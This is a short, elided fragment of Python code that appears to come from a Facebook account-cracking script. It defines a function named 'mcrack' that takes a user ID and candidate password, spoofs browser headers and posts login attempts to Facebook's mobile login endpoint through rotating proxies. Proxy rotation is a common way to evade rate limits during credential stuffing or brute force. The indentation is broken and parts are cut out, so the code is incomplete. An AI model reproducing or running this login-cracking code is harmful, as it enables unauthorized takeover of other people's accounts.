...
def mcrack(uid,pwx,tl):
    ...
    'user-agent': moz,
    'viewport-width': '980',}
			lo = session.post('https://touch.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzI3ODg1NDc1LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',data=log_data,headers=header_freefb,proxies=proxs,allow_redirects=False).text
			#print(log_data)
